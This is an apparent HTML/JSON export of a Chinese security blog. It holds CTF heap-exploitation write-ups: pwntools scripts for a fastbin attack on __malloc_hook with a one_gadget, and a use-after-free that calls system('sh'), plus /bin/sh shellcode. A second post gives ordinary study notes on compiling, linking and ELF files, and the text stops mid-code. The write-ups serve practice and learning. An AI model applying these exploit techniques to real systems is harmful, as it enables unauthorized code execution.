class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"</span></span><br><span class=\"line\"><span class=\"comment\">#p = remote(\"node3.buuoj.cn\",29310)</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn3.23\"</span>,env =&#123;<span class=\"string\">\"LD_PRELOAD\"</span>:<span class=\"string\">\"./libc-2.232.so\"</span>&#125;)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc-2.232.so\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'choice: '</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'1'</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">'size:'</span>)</span><br><span class=\"line\">    sl(str(size))</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index,size,data)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'choice: '</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'2'</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">'index:'</span>)</span><br><span class=\"line\">    sl(str(index))</span><br><span class=\"line\">    ru(<span class=\"string\">'size:'</span>)</span><br><span class=\"line\">    sl(str(size))</span><br><span class=\"line\">    ru(<span class=\"string\">'content:'</span>)</span><br><span class=\"line\">    s(data)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'choice: '</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'3'</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">'index:'</span>)</span><br><span class=\"line\">    sl(str(index))</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'choice: '</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'4'</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">'index:'</span>)</span><br><span class=\"line\">    sl(str(index))</span><br><span class=\"line\">add(<span class=\"number\">0x28</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#4</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">payload = <span class=\"string\">'\\x00'</span>*<span class=\"number\">0x28</span> + <span class=\"string\">'\\xE1'</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,(<span class=\"number\">0x28</span>+<span class=\"number\">10</span>),payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">ru(<span class=\"string\">'content: '</span>)</span><br><span class=\"line\">libc_base=uu64(r(<span class=\"number\">6</span>))<span class=\"number\">-0x3c4b78</span></span><br><span class=\"line\">leak(<span class=\"string\">\"libc_base\"</span>,libc_base)</span><br><span class=\"line\">malloc_hook = libc_base + libc.symbols[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">leak(<span class=\"string\">\"malloc_hook\"</span>,malloc_hook)</span><br><span class=\"line\">realloc = libc_base + <span class=\"number\">0x846C0</span>    <span class=\"comment\">#本地与远程区别主要在这里</span></span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4526A</span></span><br><span class=\"line\">leak(<span class=\"string\">\"realloc\"</span>,realloc)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#5 -&gt;2</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>) </span><br><span class=\"line\">payload = p64(malloc_hook<span class=\"number\">-0x23</span>)</span><br><span class=\"line\">edit(<span class=\"number\">5</span>,len(payload),payload)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>)<span class=\"comment\">#6</span></span><br><span class=\"line\">pld = <span class=\"string\">'\\x00'</span>*(<span class=\"number\">0x13</span><span class=\"number\">-0x8</span>) + p64(one_gadget)+p64(realloc)</span><br><span class=\"line\">edit(<span class=\"number\">6</span>,len(pld),pld)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-n-3\"><a href=\"#ciscn-2019-n-3\" class=\"headerlink\" title=\"ciscn_2019_n_3\"></a>ciscn_2019_n_3</h2><p>三个功能的堆</p>\n<ol>\n<li>add<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163719199.png\" alt=\"image-20210308163719199\"></li>\n<li>del<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163737207.png\" alt=\"image-20210308163737207\"></li>\n<li>print<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163753460.png\" alt=\"image-20210308163753460\"></li>\n</ol>\n<p>堆管理结构</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163854025.png\" alt=\"image-20210308163854025\"></p>\n<h3 id=\"漏洞点：-4\"><a href=\"#漏洞点：-4\" class=\"headerlink\" title=\"漏洞点：\"></a>漏洞点：</h3><ol>\n<li>UAF</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27020</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.25\")</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.23\",env =&#123;\"LD_PRELOAD\":\"./libc-2.232.so\"&#125;)</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.25\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">newnote</span><span class=\"params\">(idx,type,value,length=<span class=\"number\">0</span>)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'CNote &gt; '</span>)</span><br><span class=\"line\">    sl(str(<span class=\"number\">1</span>))</span><br><span class=\"line\">    ru(<span class=\"string\">'Index &gt; '</span>)</span><br><span class=\"line\">    sl(str(idx))</span><br><span class=\"line\">    ru(<span class=\"string\">'Type &gt; '</span>)</span><br><span class=\"line\">    sl(str(type))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> type == <span class=\"number\">1</span>:</span><br><span class=\"line\">        ru(<span class=\"string\">'Value &gt; '</span>)</span><br><span class=\"line\">        sl(str(value))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        ru(<span class=\"string\">'Length &gt; '</span>)</span><br><span class=\"line\">        sl(str(length))</span><br><span class=\"line\">        ru(<span class=\"string\">'Value &gt; '</span>)</span><br><span class=\"line\">        sl(value)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delnote</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'CNote &gt; '</span>)</span><br><span class=\"line\">    sl(str(<span class=\"number\">2</span>))</span><br><span class=\"line\">    ru(<span class=\"string\">'Index &gt; '</span>)</span><br><span class=\"line\">    sl(str(idx))</span><br><span class=\"line\">newnote(<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0x61</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">newnote(<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">0x41</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">delnote(<span class=\"number\">1</span>) <span class=\"comment\"># fastbin attack</span></span><br><span class=\"line\">delnote(<span class=\"number\">2</span>)</span><br><span class=\"line\">newnote(<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"string\">'sh\\x00\\x00'</span>+p32(elf.plt[<span class=\"string\">'system'</span>]),<span class=\"number\">0xc</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">delnote(<span class=\"number\">1</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"V-amp-N2020-公开赛-easyTHeap\"><a href=\"#V-amp-N2020-公开赛-easyTHeap\" class=\"headerlink\" title=\"[V&amp;N2020 公开赛]easyTHeap\"></a>[V&amp;N2020 公开赛]easyTHeap</h2><p>四个功能的堆</p>\n<ol>\n<li>add<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180234965.png\" alt=\"image-20210308180234965\"></li>\n<li>edit<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180253041.png\" alt=\"image-20210308180253041\"></li>\n<li>show<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/../../../Desktop/image-20210308180305916.png\" alt=\"image-20210308180305916\"></li>\n<li>del<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180318580.png\" alt=\"image-20210308180318580\"></li>\n</ol>\n<p>堆结构</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180214617.png\" alt=\"image-20210308180214617\"></p>\n","categories":[],"tags":["PWN"]},{"title":"程序员的自我修养","url":"https://pz1o.top/2021/02/14/程序员的自我修养/","content":"<h1 id=\"0x01-编译和链接\"><a href=\"#0x01-编译和链接\" class=\"headerlink\" title=\"0x01 编译和链接\"></a>0x01 编译和链接</h1><h2 id=\"1-被隐藏了的过程\"><a href=\"#1-被隐藏了的过程\" class=\"headerlink\" title=\"1.被隐藏了的过程\"></a>1.被隐藏了的过程</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc a.c</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>有四个过程</p>\n<p>预处理—&gt;编译—&gt;汇编—&gt;链接</p>\n</blockquote>\n<h3 id=\"1-1-预编译\"><a href=\"#1-1-预编译\" class=\"headerlink\" title=\"1.1 预编译\"></a>1.1 预编译</h3><p>预编译主要来处理那些源代码文件中的以”#”开头的预编译指令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -E a.c -o a.i</span><br><span class=\"line\">cpp a.c &gt; a.i</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-2-编译\"><a href=\"#1-2-编译\" class=\"headerlink\" title=\"1.2 编译\"></a>1.2 编译</h3><p>编译就是把预处理完的文件转化成相应的汇编代码文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -S a.i -o a.s</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>c编译器使用cc1</p>\n<p>c++是cc1plus</p>\n</blockquote>\n<h3 id=\"1-3-汇编\"><a href=\"#1-3-汇编\" class=\"headerlink\" title=\"1.3 汇编\"></a>1.3 汇编</h3><p>汇编器是将汇编代码转变成机器可执行的指令</p>\n<p>简单来说就是翻译，将汇编代码与机器指令一一对照翻译</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">as a.s -o a.o</span><br><span class=\"line\">gcc -c a.s -o a.o</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>汇编器是as</p>\n</blockquote>\n<p>从源文件开始，预编译，编译，汇编输出的文件叫做目标文件。</p>\n<h3 id=\"1-4-链接\"><a href=\"#1-4-链接\" class=\"headerlink\" title=\"1.4 链接\"></a>1.4 链接</h3><p>链接可以说是最难以理解的一个过程</p>\n<p>接下来会说</p>\n<h2 id=\"2-编译器在做什么\"><a href=\"#2-编译器在做什么\" class=\"headerlink\" title=\"2.编译器在做什么\"></a>2.编译器在做什么</h2><p>也就是上面我们说的第二步</p>\n<p>它通常有6个过程</p>\n<ol>\n<li>扫描</li>\n<li>语法分析</li>\n<li>语义分析</li>\n<li>源代码优化</li>\n<li>代码生成</li>\n<li>目标代码优化</li>\n</ol>\n<h3 id=\"2-1-词法分析\"><a href=\"#2-1-词法分析\" class=\"headerlink\" title=\"2.1 词法分析\"></a>2.1 词法分析</h3><p>首先源代码会被输入到扫描器中，扫描器简单地进行词法分析，运用一种类似于<strong>有限状态机</strong>地算法将源代码地字符序列分割成一系列地记号。</p>\n<p>记号一般为：关键字、识别符、字面量（数字和字符串等）和特殊符号（加号和等号）。</p>\n<h3 id=\"2-2-语法分析\"><a href=\"#2-2-语法分析\" class=\"headerlink\" title=\"2.2 语法分析\"></a>2.2 语法分析</h3><p><strong>语法分析器</strong>将对由扫描器产生的记号进行语法分析，<strong>从而产生语法树</strong></p>\n<p>简单来说，语法分析器产生的语法树就是以<strong>表达式</strong>为节点的树</p>\n<p>具体图可以看书</p>\n<h3 id=\"2-3-语义分析\"><a href=\"#2-3-语义分析\" class=\"headerlink\" title=\"2.3 语义分析\"></a>2.3 语义分析</h3><p><strong>语义分析器</strong>进行语义分析</p>\n<p>编译器所能分析的只是<strong>静态语义</strong>，与之所对应的<strong>动态语义</strong>，只有在运行过程中才可以确定</p>\n<p>静态语义通常包括声明和类型的匹配，类型转换。</p>\n<p>例如将浮点数赋值给指针很明显就是类型不匹配的。</p>\n<p>经过语义分析之后，语法树上的表达式会被标识类型。</p>\n<h3 id=\"2-4-中间语言生成\"><a href=\"#2-4-中间语言生成\" class=\"headerlink\" title=\"2.4 中间语言生成\"></a>2.4 中间语言生成</h3><p><strong>源码级优化器</strong>在不同编译器中会有所差别。</p>\n<p>但作用是一样的，都是将整个语法树转换成中间代码。</p>\n<p>中间代码·使得编译器生成前端和后端。前端负责产生机器无关的中间代码，编译器后端将中间代码转换成目标机器代码。</p>\n<h3 id=\"2-5-目标代码生成与优化\"><a href=\"#2-5-目标代码生成与优化\" class=\"headerlink\" title=\"2.5 目标代码生成与优化\"></a>2.5 目标代码生成与优化</h3><p>编译器后端主要包括<strong>代码生成器</strong>和<strong>目标代码优化器</strong></p>\n<p>代码生成器：将中间代码转换成机器代码，不同机器的不同字长、寄存器、整数数据类型、浮点数数据类型都会影响代码生成器。</p>\n<p>我们经过以上步骤生成的代码全都是<strong>未经链接的目标代码</strong>，最终都需要通过链接器将目标文件链接起来产生可执行文件。</p>\n<h2 id=\"3-链接器\"><a href=\"#3-链接器\" class=\"headerlink\" title=\"3.链接器\"></a>3.链接器</h2><p><strong>重定位</strong>：重新计算各个目标地址过程</p>\n<p><strong>符号</strong>：用来表示一个地址，可能是一段子程序的起始地址，或一个变量的起始地址</p>\n<h2 id=\"4-静态链接\"><a href=\"#4-静态链接\" class=\"headerlink\" title=\"4.静态链接\"></a>4.静态链接</h2><p>每个源码独立地编译，然后按照需要将他们组装起来，组装模块的过程叫做<strong>链接</strong>。</p>\n<p>链接过程包括<strong>地址空间分配（Address and Storage Allocation）、符号决议（Symbol Resolution）和重定位（Relocation）</strong></p>\n<blockquote>\n<p>符号决议和符号绑定大体是差不多的，但决议用于静态链接，绑定用于动态链接</p>\n</blockquote>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210207155541582.png\" alt=\"image-20210207155541582\"></p>\n<p>如图所示，源代码文件编译成目标文件，<strong>目标文件和库一起链接成可执行文件</strong>。</p>\n<blockquote>\n<p>举个例子</p>\n<p>在main.c中需要其他模块fun.c中的foo()</p>\n<p>所以我们在main.c中每一处调用foo的时候都必须知道foo这个函数的地址，但由于是单独编译的</p>\n<p>我们并不知道这个地址，若无链接器，我们需要手动修正地址</p>\n<p>通过链接器我们可以直接引用foo而无需知道它的地址，因为链接器在链接的时候，会根据所引用的符号foo，自动去相应的模块查找foo的地址，并将main中foo的地址重新修正</p>\n</blockquote>\n<h1 id=\"0x02-目标文件\"><a href=\"#0x02-目标文件\" class=\"headerlink\" title=\"0x02 目标文件\"></a>0x02 目标文件</h1><p>我们上面已经知道源代码经过预处理，编译，汇编产生的文件就叫<strong>目标文件</strong>。</p>\n<p>目标文件其实是已经编译后的可执行文件，只是有些符号和地址未被调整，本身就是按照可执行文件格式存储的，但和真正可执行文件还有所不同。</p>\n<p>可以先来看一下</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210207161220722.png\" alt=\"image-20210207161220722\"></p>\n<p>下面我们将讲这个文件到底是什么</p>\n<h2 id=\"1-目标文件的格式\"><a href=\"#1-目标文件的格式\" class=\"headerlink\" title=\"1.目标文件的格式\"></a>1.目标文件的格式</h2><p>我们熟知的windows下的PE（Portable Executable）和Linux的ELF（Executable Linkable Format）的是可执行文件</p>\n<p>目标文件就是源代码编译后但未进行链接的中间文件。它与可执行文件的内容和结构很相似，所以一般跟可执行文件格式一起用一种格式存储。</p>\n<p>此外，还有其他可执行文件格式OMF（Object Module Format）和Unix a.out格式和MS-DOS.COM格式等。</p>\n<p><strong>动态链接库</strong>（Dynamic Linking Library）（windows下的dll和linux中的so）及<strong>静态链接库</strong>（Static Linking Libary）（windows下的lib和Linux中的a）都按照可执行文件格式存储</p>\n<p>静态链接库是一个包含有很多目标文件的文件包</p>\n<p>文件格式如下</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">ELF文件类型</th>\n<th>说明</th>\n<th>实例</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">重定位文件(Relocatable File)</td>\n<td>包含代码和数据，可以被链接成可执行文件或共享目标文件，静态链接库也属于这一类</td>\n<td>Linux中.o Win下的obj</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">可执行文件(Executable File)</td>\n<td>可以执行的程序,通常无扩展名</td>\n<td>Linux中.out Win下的.exe</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">共享目标文件(Shared Object File)</td>\n<td>包含代码和数据，有两种情况。第一种是链接器可以使用这种文件跟其他的重定位文件和共享目标文件进行链接产生<strong>新的目标文件</strong>。第二种事动态链接器可以将几个共享目标文件与可执行文件结合，作为进程映像的一部分来运行</td>\n<td>Linux中.so和Win中DLL</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">核心转储文件(Core Dump File)</td>\n<td>当进程意外终止时，系统可以将该进程的地址空间的内容及终止时的一些其他信息转储到核心转储文件</td>\n<td>Linux中的Core Dump</td>\n</tr>\n</tbody>\n</table>\n</div>\n<blockquote>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210208204903438.png\" alt=\"image-20210208204903438\"></p>\n</blockquote>\n<h2 id=\"2-目标文件是什么样的\"><a href=\"#2-目标文件是什么样的\" class=\"headerlink\" title=\"2.目标文件是什么样的\"></a>2.目标文件是什么样的</h2><p>目标文件除了机器指令代码、数据，还包括了链接时所需要的一些信息，比如符号表、调试信息和符号串等。</p>\n<p>目标文件通常将这些信息按不同的属性，以<strong>节</strong>（Section）来存储，也叫<strong>段</strong>（Segment）</p>\n<p>我们熟知的代码段、数据段就是这个东西</p>\n<p><strong>代码段</strong>存储代码叫<code>.code</code>或<code>.text</code></p>\n<p><strong>数据段</strong>存储全局变量和局部静态变量叫<code>.data</code></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210208205643721.png\" alt=\"image-20210208205643721\"></p>\n<blockquote>\n<p>从这个图中可以看到，ELF文件的开头是一个文件头，<strong>它描述了整个文件的文件属性，包括文件是否可执行、是静态链接还是动态链接、目标硬件、目标操作系统等各种信息</strong></p>\n<p>此外，文件头还有一个<strong>段表</strong>，</p>\n<p>段表是一个描述<strong>文件中各个段的数组</strong>。段表描述了文件中各个段在文件中的偏移位置以及段的属性等，从段里面可以得到每个段的所有信息。</p>\n<p>文件头之后就是各个段的内容</p>\n</blockquote>\n<p><code>.text</code>：存储c语言编译后的执行语句编译成的机器代码</p>\n<p><code>.data</code>：存储已初始化的全局变量和局部静态变量</p>\n<p><code>.bss</code>：存储未初始化的全局变量和局部静态变量</p>\n<blockquote>\n<p>那么为什么要设置bss段呢？</p>\n<p>在程序中，未初始化的变量是0，如果把他们放在data段并分配空间赋值0是完全浪费空间的一种做法，</p>\n<p>所以可执行文件为了记录所有未初始化的全局变量和局部静态变量的大小总和，记做bss段</p>\n<p><strong>bss段只是为未初始化的全局变量和局部静态变量预留位置而已，并没有内容，在文件中也不占空间</strong></p>\n</blockquote>\n<p><strong>总体来说，程序源代码被编译以后主要分成两种段：程序指令和程序数据。代码段属于程序指令，而数据段和bss段属于程序数据。</strong></p>\n<h2 id=\"3-挖掘SimpleSection-o\"><a href=\"#3-挖掘SimpleSection-o\" class=\"headerlink\" title=\"3.挖掘SimpleSection.o\"></a>3.挖掘SimpleSection.o</h2><p>这里我们换成a.o</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span 